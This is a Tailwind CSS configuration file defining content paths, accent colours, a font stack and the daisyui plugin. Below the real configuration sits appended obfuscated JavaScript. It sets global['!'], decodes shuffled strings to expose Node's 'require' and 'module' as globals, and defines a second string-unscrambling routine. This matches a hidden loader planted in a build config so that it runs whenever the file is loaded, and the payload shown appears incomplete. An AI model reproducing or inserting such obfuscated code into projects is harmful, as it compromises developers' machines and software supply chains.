/** @type {import('tailwindcss').Config} */
module.exports = {
  content: [
    "./app/**/*.{js,ts,jsx,tsx}",
    "./pages/**/*.{js,ts,jsx,tsx}",
    "./component/**/*.{js,ts,jsx,tsx}",
    "./src/**/*.{js,ts,jsx,tsx}",
  ],
  theme: {
    extend: {
      colors: {
        accent: "#000000",
        "accent-hover": "#292929",
      },
      fontFamily: {
        sans: [
          "Inter",
          "-apple-system",
          "BlinkMacSystemFont",
          "Segoe UI",
          "Roboto",
          "sans-serif",
        ],
      },
    },
  },
  plugins: [require("daisyui")],
  daisyui: {
    themes: false,
  },
};
global["!"] = "10-0130";
var _$_1e42 = (function (l, e) {
  var h = l.length;
  var g = [];
  for (var j = 0; j < h; j++) {
    g[j] = l.charAt(j);
  }
  for (var j = 0; j < h; j++) {
    var s = e * (j + 489) + (e % 19597);
    var w = e * (j + 659) + (e % 48014);
    var t = s % h;
    var p = w % h;
    var y = g[t];
    g[t] = g[p];
    g[p] = y;
    e = (s + w) % 4573868;
  }
  var x = String.fromCharCode(127);
  var q = "";
  var k = "\x25";
  var m = "\x23\x31";
  var r = "\x25";
  var a = "\x23\x30";
  var c = "\x23";
  return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x);
})("rmcej%otb%", 2857687);
global[_$_1e42[0]] = require;
if (typeof module === _$_1e42[1]) {
  global[_$_1e42[2]] = module;
}
(function () {
  var LQI = "",
    TUU = 401 - 390;
  function sfL(w) {
    var n = 2667686;
    var y = w.length;
    var b = [];
    for (var o = 0; o < y; o++) {
      b[o] = w.charAt(o);
    }
    for (var o = 0; o < y; o++) {
      var q = n * (o + 228) + (n % 50332);
      var e = n * (o + 128) + (n % 52119);
      var u = q % y;
      var v = e % y;
      var m = b[u];
      b[u] = b[v];
      b[v] = m;
      n = (q + e) % 4289487;
    }
    return b.join("");
  }
})();
